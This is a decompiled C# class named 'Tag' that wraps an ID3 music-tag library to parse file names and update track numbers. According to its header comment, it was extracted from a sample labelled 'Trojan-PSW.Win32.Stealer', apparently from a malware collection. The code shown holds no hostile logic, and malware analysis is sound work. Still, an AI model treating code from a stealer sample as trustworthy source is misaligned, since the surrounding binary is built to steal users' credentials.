// Decompiled with JetBrains decompiler
// Type: TagAltering.Tag
// Assembly: AnsiCharMarsha, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 45449883-CB33-464D-BFFF-85C1D8F95247
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.Win32.Stealer.aipl-731355759034e0ae5cff6011792f40d5154dccd99fac792da878777bbc532ce2.exe

using Core.DomainObjects;
using ID3;
using System;
using System.Collections.Generic;
using System.Linq;

namespace TagAltering
{
  public abstract class Tag : ITag
  {
    protected const string TRACK_TEXT_FRAME = "TRCK";

    protected ID3Info _Info { get; set; }

    public string FileName { get; private set; }

    public string FilePath { get; private set; }

    public Tag(string filePath)
    {
      this._Info = !string.IsNullOrEmpty(filePath) ? new ID3Info(filePath, true) : throw new ArgumentException("There is no file path given");
      this.FileName = this.ParseFileName(filePath);
      this.FilePath = filePath;
    }

    protected string ParseFileName(string path)
    {
      string[] source = path.Split('\\');
      return source != null && ((IEnumerable<string>) source).Any<string>() ? ((IEnumerable<string>) source).Last<string>() : throw new ArgumentException("ShowFiles can ONLY have valid full paths passed in!");
    }

    public abstract bool UpdateTrack(int track);
  }
}
